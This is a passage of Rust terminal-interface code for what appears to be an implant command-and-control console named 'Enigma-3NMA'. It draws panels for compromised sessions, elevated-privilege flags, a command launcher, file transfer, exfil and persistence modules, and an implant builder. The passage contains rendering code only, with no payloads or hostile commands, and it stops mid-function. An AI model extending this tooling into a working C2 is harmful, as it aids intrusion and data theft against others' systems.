// DRAW ROOT
// ================================================================

fn draw(frame: &mut ratatui::Frame, app: &mut App) {
    let size = frame.size();
    let root = Layout::default()
        .direction(Direction::Vertical)
        .constraints([
            Constraint::Length(8), // Logo
            Constraint::Length(3), // Status bar
            Constraint::Min(0),    // Body
            Constraint::Length(1), // Footer
        ])
        .split(size);

    // --- Logo ---
    frame.render_widget(
        Paragraph::new(LOGO)
            .style(Style::default().fg(Color::Green))
            .block(Block::default().borders(Borders::ALL)
                .border_style(Style::default().fg(Color::DarkGray))
                .title(Span::styled(" Enigma-3NMA ", Style::default().fg(Color::Green).add_modifier(Modifier::BOLD)))),
        root[0],
    );

    // --- Status bar ---
    let total_modules: usize = app.categories.iter()
        .flat_map(|c| &c.subcategories)
        .map(|s| s.modules.len())
        .sum();
    let active_count   = app.sessions.iter().filter(|s| s.status == "Active").count();
    let idle_count     = app.sessions.iter().filter(|s| s.status == "Idle").count();
    let lost_count     = app.sessions.iter().filter(|s| s.status == "Lost").count();
    let elevated_count = app.sessions.iter().filter(|s| s.elevated).count();
    let build_status   = app.builder.current_status();
    let build_label    = match &build_status {
        BuildStatus::Idle     => "Idle",
        BuildStatus::Building => "Building…",
        BuildStatus::Success  => "Success",
        BuildStatus::Failed   => "Failed",
    };
    let listener_label = if app.listener_ok {
        format!(":{} LISTEN  ", app.listener_port)
    } else {
        format!(":{} FAILED  ", app.listener_port)
    };
    let listener_color = if app.listener_ok { Color::Green } else { Color::Red };

    frame.render_widget(
        Paragraph::new(Line::from(vec![
            Span::styled("  ● ", Style::default().fg(Color::Green)),
            Span::styled("Status: ",             Style::default().fg(Color::DarkGray)),
            Span::styled("All Systems Nominal  ", Style::default().fg(Color::White)),
            Span::styled("| Sessions: ",         Style::default().fg(Color::DarkGray)),
            Span::styled(format!("{} active ", active_count),  Style::default().fg(Color::Green)),
            Span::styled(format!("{} idle ", idle_count),      Style::default().fg(Color::Yellow)),
            Span::styled(format!("{} lost  ", lost_count),     Style::default().fg(Color::Red)),
            Span::styled("| Elevated: ",         Style::default().fg(Color::DarkGray)),
            Span::styled(format!("{}  ", elevated_count),      Style::default().fg(Color::Magenta)),
            Span::styled("| Modules: ",          Style::default().fg(Color::DarkGray)),
            Span::styled(format!("{} loaded  ",  total_modules), Style::default().fg(Color::Cyan)),
            Span::styled("| Listener: ",         Style::default().fg(Color::DarkGray)),
            Span::styled(listener_label,          Style::default().fg(listener_color).add_modifier(Modifier::BOLD)),
            Span::styled("| Builder: ",          Style::default().fg(Color::DarkGray)),
            Span::styled(build_label,            Style::default().fg(build_status_color(&build_status)).add_modifier(Modifier::BOLD)),
        ]))
        .block(Block::default().borders(Borders::ALL)
            .border_style(Style::default().fg(Color::DarkGray))
            .title(Span::styled(" System Status ", Style::default().fg(Color::Cyan)))),
        root[1],
    );

    // --- Body: three column layout ---
    // Module Tree | Implant Panel | Builder
    let body = Layout::default()
        .direction(Direction::Horizontal)
        .constraints([
            Constraint::Percentage(35),
            Constraint::Percentage(35),
            Constraint::Percentage(30),
        ])
        .split(root[2]);

    draw_module_tree(frame, app, body[0]);
    draw_implant_world(frame, app, body[1]);
    draw_builder_world(frame, app, body[2]);

    // --- Footer ---
    let footer_spans: Vec<Span> = match app.focus {
        Panel::Builder => vec![
            Span::styled(" ↑↓/Tab ", Style::default().fg(Color::Yellow)),   Span::raw("Field  "),
            Span::styled(" ←→ ",     Style::default().fg(Color::Yellow)),   Span::raw("Option  "),
            Span::styled(" Enter ",  Style::default().fg(Color::Green).add_modifier(Modifier::BOLD)),  Span::raw("Edit/Confirm  "),
            Span::styled(" b ",      Style::default().fg(Color::Cyan).add_modifier(Modifier::BOLD)),   Span::raw("Build  "),
            Span::styled(" c ",      Style::default().fg(Color::Red).add_modifier(Modifier::BOLD)),    Span::raw("Clear log  "),
            Span::styled(" u/d ",    Style::default().fg(Color::Yellow)),   Span::raw("Scroll log  "),
            Span::styled(" Esc ",    Style::default().fg(Color::Yellow)),   Span::raw("Back  "),
            Span::styled(" F1 ",     Style::default().fg(Color::Magenta).add_modifier(Modifier::BOLD)), Span::raw("Modules  "),
        ],
        Panel::SessionDetail => vec![
            Span::styled(" m ",      Style::default().fg(Color::Cyan).add_modifier(Modifier::BOLD)),   Span::raw("Modules  "),
            Span::styled(" c ",      Style::default().fg(Color::Green).add_modifier(Modifier::BOLD)),  Span::raw("Commands  "),
            Span::styled(" h/Esc ",  Style::default().fg(Color::Yellow)),   Span::raw("Back  "),
            Span::styled(" Tab ",    Style::default().fg(Color::Magenta).add_modifier(Modifier::BOLD)), Span::raw("Builder  "),
            Span::styled(" q ",      Style::default().fg(Color::Red).add_modifier(Modifier::BOLD)),    Span::raw("Quit"),
        ],
        Panel::ImplantCommand => vec![
            Span::styled(" ↑↓/jk ",  Style::default().fg(Color::Yellow)),  Span::raw("Select  "),
            Span::styled(" Enter ",  Style::default().fg(Color::Green).add_modifier(Modifier::BOLD)),  Span::raw("Dispatch  "),
            Span::styled(" Esc/q ",  Style::default().fg(Color::Yellow)),   Span::raw("Close  "),
        ],
        _ => vec![
            Span::styled(" ↑↓/jk ",  Style::default().fg(Color::Yellow)),  Span::raw("Navigate  "),
            Span::styled("→/Enter ", Style::default().fg(Color::Yellow)),  Span::raw("Drill in  "),
            Span::styled("←/Esc ",   Style::default().fg(Color::Yellow)),  Span::raw("Back  "),
            Span::styled(" Tab ",    Style::default().fg(Color::Magenta).add_modifier(Modifier::BOLD)), Span::raw("Switch World  "),
            Span::styled(" q ",      Style::default().fg(Color::Red).add_modifier(Modifier::BOLD)),   Span::raw("Quit"),
        ],
    };
    frame.render_widget(
        Paragraph::new(Line::from(footer_spans)).style(Style::default().fg(Color::DarkGray)),
        root[3],
    );

    // Overlays
    if app.focus == Panel::ImplantCommand {
        draw_command_overlay(frame, app, size);
    }

    if let Some(ref fo) = app.file_op {
        draw_file_operation(frame, app, fo, size);
    }
}


// ================================================================
// MODULE TREE WORLD
// ================================================================

fn draw_module_tree(frame: &mut ratatui::Frame, app: &mut App, area: Rect) {
    let world_active = app.focus.in_module_world();
    let (border_type, border_style) = world_border(world_active);
    let world_title = if world_active {
        Span::styled(" ◆ Module Tree ", Style::default().fg(Color::Cyan).add_modifier(Modifier::BOLD))
    } else {
        Span::styled(" ◇ Module Tree ", Style::default().fg(Color::DarkGray))
    };
    frame.render_widget(
        Block::default().borders(Borders::ALL).border_type(border_type).border_style(border_style).title(world_title),
        area,
    );
    let inner = inner_rect(area, 1);
    let cols = Layout::default()
        .direction(Direction::Horizontal)
        .constraints([Constraint::Length(20), Constraint::Length(22), Constraint::Min(0)])
        .split(inner);

    // Category
    let cat_focus = app.focus == Panel::Category;
    let items: Vec<ListItem> = app.categories.iter().enumerate().map(|(i, c)| {
        let style = if Some(i) == app.cat_state.selected() && cat_focus {
            Style::default().fg(Color::Black).bg(Color::Green).add_modifier(Modifier::BOLD)
        } else { Style::default().fg(Color::White) };
        ListItem::new(format!("  {}", c.name)).style(style)
    }).collect();
    frame.render_stateful_widget(
        List::new(items)
            .block(Block::default().borders(Borders::ALL).border_style(panel_border(cat_focus))
                .title(Span::styled(" Category ", Style::default().fg(Color::Cyan).add_modifier(Modifier::BOLD))))
            .highlight_symbol("▶ "),
        cols[0], &mut app.cat_state,
    );

    // Subcategory
    let sub_focus = app.focus == Panel::Subcategory;
    let ci = app.sel_cat();
    let cat_name = app.categories.get(ci).map(|c| c.name.clone()).unwrap_or_default();
    let subs: Vec<_> = app.categories.get(ci).map(|c| c.subcategories.clone()).unwrap_or_default();
    let items: Vec<ListItem> = subs.iter().enumerate().map(|(i, s)| {
        let style = if Some(i) == app.sub_state.selected() && sub_focus {
            Style::default().fg(Color::Black).bg(Color::Green).add_modifier(Modifier::BOLD)
        } else { Style::default().fg(Color::White) };
        ListItem::new(format!("  {}", s.name)).style(style)
    }).collect();
    frame.render_stateful_widget(
        List::new(items)
            .block(Block::default().borders(Borders::ALL).border_style(panel_border(sub_focus))
                .title(Span::styled(format!(" {} ", cat_name), Style::default().fg(Color::Yellow).add_modifier(Modifier::BOLD))))
            .highlight_symbol("▶ "),
        cols[1], &mut app.sub_state,
    );

    // Module + detail
    let mod_split = Layout::default()
        .direction(Direction::Vertical)
        .constraints([Constraint::Percentage(50), Constraint::Percentage(50)])
        .split(cols[2]);

    let mod_focus = app.focus == Panel::Module;
    let si = app.sel_sub();
    let sub_name = subs.get(si).map(|s| s.name.clone()).unwrap_or_default();
    let mods: Vec<_> = subs.get(si).map(|s| s.modules.clone()).unwrap_or_default();
    let items: Vec<ListItem> = mods.iter().enumerate().map(|(i, m)| {
        let style = if Some(i) == app.mod_state.selected() && mod_focus {
            Style::default().fg(Color::Black).bg(Color::Green).add_modifier(Modifier::BOLD)
        } else { Style::default().fg(Color::White) };
        ListItem::new(format!("  {}", m.name)).style(style)
    }).collect();
    frame.render_stateful_widget(
        List::new(items)
            .block(Block::default().borders(Borders::ALL).border_style(panel_border(mod_focus))
                .title(Span::styled(format!(" {} ", sub_name), Style::default().fg(Color::Yellow).add_modifier(Modifier::BOLD))))
            .highlight_symbol("▶ "),
        mod_split[0], &mut app.mod_state,
    );

    let detail_text = if let Some(m) = mods.get(app.sel_mod()) {
        format!(
            "\n  Name     : {}\n  Category : {}\n  Subcat   : {}\n  Path     : {}\n\n  Press Enter to run.",
            m.name, m.category, m.subcategory, m.path.display()
        )
    } else { "\n  No module selected.".into() };
    frame.render_widget(
        Paragraph::new(detail_text).style(Style::default().fg(Color::White))
            .block(Block::default().borders(Borders::ALL).border_style(Style::default().fg(Color::DarkGray))
                .title(Span::styled(" Detail ", Style::default().fg(Color::Cyan)))),
        mod_split[1],
    );
}


// ================================================================
// IMPLANT WORLD
// ================================================================

fn draw_implant_world(frame: &mut ratatui::Frame, app: &mut App, area: Rect) {
    let world_active = app.focus.in_implant_world();
    let (border_type, border_style) = world_border(world_active);
    let world_title = if world_active {
        Span::styled(" ◆ Implant Panel ", Style::default().fg(Color::Cyan).add_modifier(Modifier::BOLD))
    } else {
        Span::styled(" ◇ Implant Panel ", Style::default().fg(Color::DarkGray))
    };
    frame.render_widget(
        Block::default().borders(Borders::ALL).border_type(border_type).border_style(border_style).title(world_title),
        area,
    );
    let inner = inner_rect(area, 1);

    match &app.focus {
        Panel::Sessions => draw_session_list(frame, app, inner),
        Panel::SessionDetail | Panel::ImplantModules | Panel::ImplantCommand => {
            draw_session_detail_view(frame, app, inner);
        }
        Panel::TransportSelector => draw_transport_selector(frame, app, inner),
        Panel::RLModelStatus => draw_rl_model_status(frame, app, inner),
        _ => draw_session_list(frame, app, inner),
    }
}

fn draw_session_list(frame: &mut ratatui::Frame, app: &mut App, area: Rect) {
    let focused = app.focus == Panel::Sessions;

    let split = Layout::default()
        .direction(Direction::Vertical)
        .constraints([Constraint::Length(1), Constraint::Min(0)])
        .split(area);

    frame.render_widget(
        Paragraph::new(Line::from(vec![
            Span::raw("      "),
            Span::styled(format!("{:<16}", "IP Address"),      Style::default().fg(Color::DarkGray).add_modifier(Modifier::BOLD)),
            Span::styled(format!("{:<20}", "User @ Hostname"), Style::default().fg(Color::DarkGray).add_modifier(Modifier::BOLD)),
            Span::styled(format!("{:<7}",  "Proto"),           Style::default().fg(Color::DarkGray).add_modifier(Modifier::BOLD)),
            Span::styled(format!("{:<8}",  "Status"),          Style::default().fg(Color::DarkGray).add_modifier(Modifier::BOLD)),
            Span::styled("Mods",                               Style::default().fg(Color::DarkGray).add_modifier(Modifier::BOLD)),
        ])),
        split[0],
    );

    if app.sessions.is_empty() {
        frame.render_widget(
            Paragraph::new(Line::from(vec![
                Span::styled("  Waiting for agents…  ", Style::default().fg(Color::DarkGray)),
                Span::styled(
                    format!("(listener :{})", app.listener_port),
                    Style::default().fg(if app.listener_ok { Color::Green } else { Color::Red }),
                ),
            ]))
            .block(Block::default().borders(Borders::TOP)
                .border_style(Style::default().fg(Color::DarkGray))
                .title(Span::styled(" Sessions ", Style::default().fg(Color::Cyan).add_modifier(Modifier::BOLD)))),
            split[1],
        );
        return;
    }

    let items: Vec<ListItem> = app.sessions.iter().enumerate().map(|(i, s)| {
        let sel = Some(i) == app.sess_state.selected() && focused;
        let elev = if s.elevated { Span::styled("⬆ ", Style::default().fg(Color::Magenta)) } else { Span::raw("  ") };
        let line = Line::from(vec![
            Span::raw("  "),
            elev,
            Span::styled("● ", Style::default().fg(status_color(&s.status))),
            Span::styled(format!("{:<16}", s.ip),                                Style::default().fg(Color::White)),
            Span::styled(format!("{:<20}", format!("{}@{}", s.user, s.hostname)), Style::default().fg(Color::Cyan)),
            Span::styled(format!("{:<7}",  s.protocol),                          Style::default().fg(Color::DarkGray)),
            Span::styled(format!("{:<8}",  s.status),                            Style::default().fg(status_color(&s.status))),
            Span::styled(format!("[{}]", s.modules.len()),                       Style::default().fg(Color::DarkGray)),
        ]);
        ListItem::new(line).style(if sel {
            Style::default().fg(Color::Black).bg(Color::Green).add_modifier(Modifier::BOLD)
        } else { Style::default().fg(Color::White) })
    }).collect();

    frame.render_stateful_widget(
        List::new(items)
            .block(Block::default().borders(Borders::TOP)
                .border_style(Style::default().fg(Color::DarkGray))
                .title(Span::styled(
                    " Sessions  →/Enter to inspect ",
                    Style::default().fg(Color::Cyan).add_modifier(Modifier::BOLD),
                )))
            .highlight_symbol("▶ "),
        split[1],
        &mut app.sess_state,
    );
}

fn draw_session_detail_view(frame: &mut ratatui::Frame, app: &mut App, area: Rect) {
    let Some(sess) = app.selected_session().cloned() else { return; };

    let vsplit = Layout::default()
        .direction(Direction::Vertical)
        .constraints([Constraint::Length(12), Constraint::Min(0)])
        .split(area);

    let detail_focused = app.focus == Panel::SessionDetail;
    let elev_str   = if sess.elevated { "YES ⬆  (admin / root)" } else { "no" };
    let elev_color = if sess.elevated { Color::Magenta } else { Color::DarkGray };
    // Pre-compute derived values before consuming owned fields.
    let title      = format!(" {} — {} ", sess.id, sess.hostname);
    let status_sym = match sess.status.as_str() { "Active" => "● ACTIVE", "Idle" => "◌ IDLE", _ => "✕ LOST" };
    let status_c   = status_color(&sess.status);

    let info_lines = vec![
        Line::from(vec![Span::styled(format!("  {:>12}  ", "ID"),         Style::default().fg(Color::DarkGray)), Span::styled(sess.id.as_str(),       Style::default().fg(Color::White).add_modifier(Modifier::BOLD)), Span::raw("   "), Span::styled(status_sym, Style::default().fg(status_c).add_modifier(Modifier::BOLD))]),
        Line::from(vec![Span::styled(format!("  {:>12}  ", "Implant"),    Style::default().fg(Color::DarkGray)), Span::styled(sess.name.as_str(),     Style::default().fg(Color::Cyan))]),
        Line::from(vec![Span::styled(format!("  {:>12}  ", "Hostname"),   Style::default().fg(Color::DarkGray)), Span::styled(sess.hostname.as_str(), Style::default().fg(Color::White))]),
        Line::from(vec![Span::styled(format!("  {:>12}  ", "IP / Subnet"),Style::default().fg(Color::DarkGray)), Span::styled(sess.ip.as_str(),       Style::default().fg(Color::Green)),   Span::raw("  /  "), Span::styled(sess.subnet.as_str(), Style::default().fg(Color::DarkGray))]),
        Line::from(vec![Span::styled(format!("  {:>12}  ", "Beacon"),     Style::default().fg(Color::DarkGray)), Span::styled(sess.beacon.as_str(),   Style::default().fg(Color::White)),    Span::styled(format!("  [{}]", sess.protocol), Style::default().fg(Color::DarkGray))]),
        Line::from(vec![Span::styled(format!("  {:>12}  ", "User"),       Style::default().fg(Color::DarkGray)), Span::styled(sess.user.as_str(),     Style::default().fg(Color::White)),    Span::styled(format!("  (PID {})", sess.pid), Style::default().fg(Color::DarkGray))]),
        Line::from(vec![Span::styled(format!("  {:>12}  ", "Elevated"),   Style::default().fg(Color::DarkGray)), Span::styled(elev_str, Style::default().fg(elev_color).add_modifier(Modifier::BOLD))]),
        Line::from(vec![Span::styled(format!("  {:>12}  ", "OS / Arch"),  Style::default().fg(Color::DarkGray)), Span::styled(sess.os.as_str(),       Style::default().fg(Color::White)),    Span::styled(format!("  ({})", sess.arch), Style::default().fg(Color::DarkGray))]),
        Line::from(vec![Span::styled(format!("  {:>12}  ", "Last Seen"),  Style::default().fg(Color::DarkGray)), Span::styled(sess.last_seen.as_str(), Style::default().fg(status_c)), Span::styled(format!("  up {}", sess.uptime), Style::default().fg(Color::DarkGray))]),
    ];

    frame.render_widget(
        Paragraph::new(info_lines)
            .block(Block::default().borders(Borders::ALL)
                .border_style(panel_border(detail_focused))
                .title(Span::styled(title, Style::default().fg(Color::Yellow).add_modifier(Modifier::BOLD)))),
        vsplit[0],
    );

    let bottom = Layout::default()
        .direction(Direction::Horizontal)
        .constraints([Constraint::Percentage(62), Constraint::Percentage(38)])
        .split(vsplit[1]);

    draw_loaded_modules(frame, app, &sess, bottom[0]);
    draw_action_hints(frame, app, bottom[1]);
}

fn draw_loaded_modules(frame: &mut ratatui::Frame, app: &mut App, sess: &ImplantSession, area: Rect) {
    let focused = app.focus == Panel::ImplantModules;
    let items: Vec<ListItem> = sess.modules.iter().enumerate().map(|(i, m)| {
        let sel = Some(i) == app.imod_state.selected() && focused;
        let dot = if m.active { Span::styled("● ", Style::default().fg(Color::Green)) } else { Span::styled("○ ", Style::default().fg(Color::DarkGray)) };
        let line = Line::from(vec![
            Span::raw("  "), dot,
            Span::styled(format!("{:<18}", m.name),  Style::default().fg(Color::White)),
            Span::styled(format!("{:<9}", m.kind),   Style::default().fg(kind_color(m.kind))),
            Span::styled(format!("v{}", m.version),  Style::default().fg(Color::DarkGray)),
        ]);
        ListItem::new(line).style(if sel {
            Style::default().fg(Color::Black).bg(Color::Green).add_modifier(Modifier::BOLD)
        } else { Style::default().fg(Color::White) })
    }).collect();

    frame.render_stateful_widget(
        List::new(items)
            .block(Block::default().borders(Borders::ALL)
                .border_style(panel_border(focused))
                .title(Span::styled(
                    " Loaded Modules  [m] focus ",
                    Style::default().fg(if focused { Color::Green } else { Color::Cyan }).add_modifier(Modifier::BOLD),
                )))
            .highlight_symbol("▶ "),
        area,
        &mut app.imod_state,
    );
}

fn draw_action_hints(frame: &mut ratatui::Frame, app: &App, area: Rect) {
    let mut lines = vec![];

    // Show last action if present
    if !app.last_action.is_empty() {
        lines.push(Line::from(Span::styled(format!("  ✓ {}", app.last_action), Style::default().fg(Color::Green).add_modifier(Modifier::BOLD))));
        lines.push(Line::from(Span::raw("")));
    }

    lines.extend(vec![
        Line::from(Span::styled("  Quick Actions", Style::default().fg(Color::DarkGray).add_modifier(Modifier::BOLD))),
        Line::from(Span::raw("")),
        Line::from(vec![Span::styled("  [c] ", Style::default().fg(Color::Green).add_modifier(Modifier::BOLD)),  Span::styled("Command launcher", Style::default().fg(Color::White))]),
        Line::from(vec![Span::styled("  [m] ", Style::default().fg(Color::Cyan).add_modifier(Modifier::BOLD)),   Span::styled("Browse modules",   Style::default().fg(Color::White))]),
        Line::from(vec![Span::styled("  [t] ", Style::default().fg(Color::Blue).add_modifier(Modifier::BOLD)),   Span::styled("Select transport", Style::default().fg(Color::White))]),
        Line::from(vec![Span::styled("  [l] ", Style::default().fg(Color::Magenta).add_modifier(Modifier::BOLD)), Span::styled("RL Model status",  Style::default().fg(Color::White))]),
        Line::from(vec![Span::styled("  [h] ", Style::default().fg(Color::Yellow).add_modifier(Modifier::BOLD)), Span::styled("Back to list",     Style::default().fg(Color::White))]),
        Line::from(Span::raw("")),
        Line::from(Span::styled("  Legend", Style::default().fg(Color::DarkGray).add_modifier(Modifier::BOLD))),
        Line::from(Span::raw("")),
        Line::from(vec![Span::styled("  ● ", Style::default().fg(Color::Green)),    Span::styled("module active",    Style::default().fg(Color::DarkGray))]),
        Line::from(vec![Span::styled("  ○ ", Style::default().fg(Color::DarkGray)), Span::styled("module idle",      Style::default().fg(Color::DarkGray))]),
        Line::from(vec![Span::styled("  ⬆ ", Style::default().fg(Color::Magenta)),  Span::styled("elevated session", Style::default().fg(Color::DarkGray))]),
        Line::from(Span::raw("")),
        Line::from(Span::styled("  Kinds", Style::default().fg(Color::DarkGray).add_modifier(Modifier::BOLD))),
        Line::from(Span::raw("")),
        Line::from(vec![Span::styled("  recon   ", Style::default().fg(Color::Cyan)),    Span::styled("persist", Style::default().fg(Color::Magenta))]),
        Line::from(vec![Span::styled("  exfil   ", Style::default().fg(Color::Yellow)),  Span::styled("tunnel",  Style::default().fg(Color::Blue))]),
    ]);
    frame.render_widget(
        Paragraph::new(lines)
            .block(Block::default().borders(Borders::ALL)
                .border_style(Style::default().fg(Color::DarkGray))
                .title(Span::styled(" Actions ", Style::default().fg(Color::Cyan)))),
        area,
    );
}

fn draw_transport_selector(frame: &mut ratatui::Frame, app: &mut App, area: Rect) {
    let focused = app.focus == Panel::TransportSelector;
    let items: Vec<ListItem> = app.transports.iter().enumerate().map(|(i, tm)| {
        let sel = Some(i) == app.transport_state.selected() && focused;
        let status_icon = if tm.is_connected { "✓" } else { "○" };
        let active_marker = if tm.is_active { " ◄ ACTIVE" } else { "" };
        let status_color = if tm.is_active { Color::Green } else { Color::DarkGray };
        let line = Line::from(vec![
            Span::raw("  "),
            Span::styled(status_icon, Style::default().fg(status_color)),
            Span::raw(" "),
            Span::styled(format!("{:<20}", tm.name), Style::default().fg(Color::White)),
            Span::styled(format!("(p:{}){}", tm.priority, active_marker),
                       Style::default().fg(if tm.is_active { Color::Green } else { Color::DarkGray })),
        ]);
        ListItem::new(line).style(if sel {
            Style::default().fg(Color::Black).bg(Color::Cyan).add_modifier(Modifier::BOLD)
        } else { Style::default() })
    }).collect();

    frame.render_stateful_widget(
        List::new(items)
            .block(Block::default().borders(Borders::ALL)
                .border_style(panel_border(focused))
                .title(Span::styled(
                    " Transport Selector  [Enter] switch  [Esc] back ",
                    Style::default().fg(if focused { Color::Green } else { Color::Cyan }).add_modifier(Modifier::BOLD),
                )))
            .highlight_symbol("▶ "),
        area,
        &mut app.transport_state,
    );
}

fn draw_rl_model_status(frame: &mut ratatui::Frame, app: &mut App, area: Rect) {
    let focused = app.focus == Panel::RLModelStatus;
    let metrics = &app.rl_metrics;

    let lines = vec![
        Line::from(vec![
            Span::styled("Training Status", Style::default().fg(Color::Cyan).add_modifier(Modifier::BOLD)),
        ]),
        Line::from(vec![]),
        Line::from(vec![
            Span::raw("  Steps: "),
            Span::styled(format!("{}", metrics.step_count), Style::default().fg(Color::Yellow)),
        ]),
        Line::from(vec![
            Span::raw("  Epsilon: "),
            Span::styled(format!("{:.4}", metrics.epsilon), Style::default().fg(Color::Yellow)),
            Span::raw(" (exploration rate)"),
        ]),
        Line::from(vec![
            Span::raw("  Avg Loss: "),
            Span::styled(format!("{:.6}", metrics.avg_loss), Style::default().fg(Color::Yellow)),
        ]),
        Line::from(vec![]),
        Line::from(vec![
            Span::styled("Beacon Performance", Style::default().fg(Color::Cyan).add_modifier(Modifier::BOLD)),
        ]),
        Line::from(vec![]),
        Line::from(vec![
            Span::raw("  Success Rate: "),
            Span::styled(format!("{:.1}%", metrics.success_rate * 100.0), Style::default().fg(Color::Green)),
        ]),
        Line::from(vec![
            Span::raw("  Successful: "),
            Span::styled(format!("{}", metrics.successful_beacons), Style::default().fg(Color::Green)),
            Span::raw("  Failed: "),
            Span::styled(format!("{}", metrics.failed_beacons), Style::default().fg(Color::Red)),
        ]),
        Line::from(vec![]),
        Line::from(vec![
            Span::styled("Current Episode", Style::default().fg(Color::Cyan).add_modifier(Modifier::BOLD)),
        ]),
        Line::from(vec![]),
        Line::from(vec![
            Span::raw("  Reward: "),
            Span::styled(format!("{:.2}", metrics.current_episode_reward), Style::default().fg(Color::Magenta)),
        ]),
        Line::from(vec![
            Span::raw("  Buffer Size: "),
            Span::styled(format!("{} / 10000", metrics.memory_size), Style::default().fg(Color::DarkGray)),
        ]),
        Line::from(vec![]),
        Line::from(vec![
            Span::styled("[l] RL Model  [Esc] Back", Style::default().fg(Color::DarkGray)),
        ]),
    ];

    frame.render_widget(
        Paragraph::new(lines)
            .block(Block::default()
                .borders(Borders::ALL)
                .border_style(panel_border(focused))
                .title(Span::styled(
                    " RL Beacon Agent Model Status ",
                    Style::default().fg(if focused { Color::Green } else { Color::Cyan }).add_modifier(Modifier::BOLD),
                ))),
        area,
    );
}


// ================================================================
// COMMAND LAUNCHER OVERLAY
// ================================================================

fn draw_command_overlay(frame: &mut ratatui::Frame, app: &mut App, area: Rect) {
    let popup_w = 64u16.min(area.width.saturating_sub(4));
    let popup_h = (COMMANDS.len() as u16 + 4).min(area.height.saturating_sub(4));
    let x = area.x + (area.width.saturating_sub(popup_w)) / 2;
    let y = area.y + (area.height.saturating_sub(popup_h)) / 2;
    let popup_area = Rect { x, y, width: popup_w, height: popup_h };
    frame.render_widget(Clear, popup_area);

    let title = app.selected_session()
        .map(|s| format!(" Launch Command — {} / {} ", s.id, s.hostname))
        .unwrap_or_else(|| " Launch Command ".into());

    let items: Vec<ListItem> = COMMANDS.iter().enumerate().map(|(i, (cmd, desc))| {
        let sel = app.cmd_state.selected() == Some(i);
        let base = if sel { Style::default().fg(Color::Black).bg(Color::Green).add_modifier(Modifier::BOLD) } else { Style::default() };
        ListItem::new(Line::from(vec![
            Span::raw("  "),
            Span::styled(format!("{:<15}", cmd), base.patch(if sel { Style::default() } else { Style::default().fg(Color::Green) })),
            Span::raw(" "),
            Span::styled(*desc, base.patch(if sel { Style::default() } else { Style::default().fg(Color::DarkGray) })),
        ])).style(base)
    }).collect();

    frame.render_stateful_widget(
        List::new(items)
            .block(Block::default()
                .borders(Borders::ALL)
                .border_type(BorderType::Double)
                .border_style(Style::default().fg(Color::Green).add_modifier(Modifier::BOLD))
                .title(Span::styled(title, Style::default().fg(Color::Green).add_modifier(Modifier::BOLD)))
                .title_bottom(Span::styled(" Enter dispatch  ·  Esc / q close ", Style::default().fg(Color::DarkGray))))
            .highlight_symbol("▶ "),
        popup_area,
        &mut app.cmd_state,
    );
}


// ================================================================
// FILE OPERATION OVERLAY
// ================================================================

fn draw_file_operation(frame: &mut ratatui::Frame, app: &App, fo: &FileOperation, area: Rect) {
    let popup_w = 75u16.min(area.width.saturating_sub(4));
    let popup_h = 17u16;
    let x = area.x + (area.width.saturating_sub(popup_w)) / 2;
    let y = area.y + (area.height.saturating_sub(popup_h)) / 2;
    let popup_area = Rect { x, y, width: popup_w, height: popup_h };
    frame.render_widget(Clear, popup_area);

    let mode_str = if fo.mode == FileOpMode::Upload { "UPLOAD" } else { "DOWNLOAD" };
    let sess_name = app.selected_session().map(|s| s.id.clone()).unwrap_or_else(|| "unknown".to_string());

    let mut lines = vec![
        Line::from(vec![
            Span::styled(format!("  {} → {}", mode_str, sess_name), Style::default().fg(Color::Cyan).add_modifier(Modifier::BOLD)),
        ]),
        Line::from(vec![]),
    ];

    // Step 1: Path input
    let path_complete = !fo.local_path.is_empty() && fo.path_input_step >= 1;
    let label1 = if fo.mode == FileOpMode::Upload { "Local: " } else { "Remote: " };
    lines.push(Line::from(vec![
        Span::styled(format!("  {}", label1), Style::default().fg(if path_complete { Color::Green } else { Color::DarkGray })),
        Span::styled(&fo.local_path, Style::default().fg(Color::White).add_modifier(Modifier::BOLD)),
        if fo.path_input_step == 0 && fo.progress == 0.0 { Span::raw("█") } else { Span::raw("") },
    ]));

    // Step 2: Second path (Remote for upload, Local for download)
    let label2 = if fo.mode == FileOpMode::Upload { "Remote: " } else { "Local: " };
    let path2_complete = !fo.remote_path.is_empty();
    lines.push(Line::from(vec![
        Span::styled(format!("  {}", label2), Style::default().fg(if path2_complete { Color::Green } else { Color::DarkGray })),
        Span::styled(&fo.remote_path, Style::default().fg(Color::White).add_modifier(Modifier::BOLD)),
        if fo.path_input_step == 1 && fo.progress == 0.0 { Span::raw("█") } else { Span::raw("") },
    ]));

    lines.push(Line::from(vec![]));

    if fo.progress > 0.0 && fo.progress < 1.0 {
        let progress_bar = format!("[{}{}] {:.0}%",
            "█".repeat((fo.progress * 25.0) as usize),
            "░".repeat((25.0 - (fo.progress * 25.0)) as usize),
            fo.progress * 100.0);
        lines.push(Line::from(vec![
            Span::raw("  "),
            Span::styled(progress_bar, Style::default().fg(Color::Green)),
        ]));
    } else {
        lines.push(Line::from(vec![
            Span::styled("  Status: ", Style::default().fg(Color::DarkGray)),
            Span::styled(&fo.status, Style::default().fg(
                if fo.progress >= 1.0 { Color::Green } else { Color::Yellow }
            )),
        ]));
    }

    lines.push(Line::from(vec![]));

    if fo.progress >= 1.0 {
        lines.push(Line::from(vec![
            Span::styled("  [Esc] close  ·  [c] new command", Style::default().fg(Color::DarkGray)),
        ]));
    } else if fo.progress == 0.0 {
        lines.push(Line::from(vec![
            Span::styled("  Type path  ·  [Enter] next  ·  [Esc] cancel", Style::default().fg(Color::DarkGray)),
        ]));
    }

    frame.render_widget(
        Paragraph::new(lines)
            .block(Block::default()
                .borders(Borders::ALL)
                .border_type(BorderType::Double)
                .border_style(Style::default().fg(Color::Blue).add_modifier(Modifier::BOLD))
                .title(Span::styled(
                    format!(" File {} ", mode_str.to_lowercase()),
                    Style::default().fg(Color::Blue).add_modifier(Modifier::BOLD)))),
        popup_area,
    );
}


// ================================================================
// BUILDER WORLD
// ================================================================

fn draw_builder_world(frame: &mut ratatui::Frame, app: &mut App, area: Rect) {
    let world_active = app.focus.in_builder_world();
    let (border_type, border_style) = world_border(world_active);
    let world_title = if world_active {
        Span::styled(" ◆ Implant Builder ", Style::default().fg(Color::Cyan).add_modifier(Modifier::BOLD))
    } else {
        Span::styled(" ◇ Implant Builder ", Style::default().fg(Color::DarkGray))
    };
    frame.render_widget(
        Block::default().borders(Borders::ALL).border_type(border_type).border_style(border_style).title(world_title),
        area,
    );
    let inner = inner_rect(area, 1);

    // Split vertically: config form (top) + build log (bottom)
    let vsplit = Layout::default()
        .direction(Direction::Vertical)
        .constraints([Constraint::Length(22), Constraint::Min(0)])
        .split(inner);

